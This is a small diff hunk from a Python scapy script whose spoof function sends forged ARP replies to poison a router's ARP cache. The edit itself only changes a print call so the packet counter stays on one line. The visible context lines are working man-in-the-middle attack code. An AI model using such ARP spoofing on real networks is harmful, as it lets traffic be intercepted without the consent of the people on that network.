@@ -41,7 +41,7 @@ def spoof(target, router):
         packet = scapy.ARP(op=2, pdst=router_ip, hwdst=router_mac, psrc=target_ip)
         scapy.send(packet, verbose=False)
         packets_sent +=2
-        print(f"\r[+] Packets sent : {packets_sent}")
+        print(f"\r[+] Packets sent : {packets_sent}", end="")
         time.sleep(2)
 
 
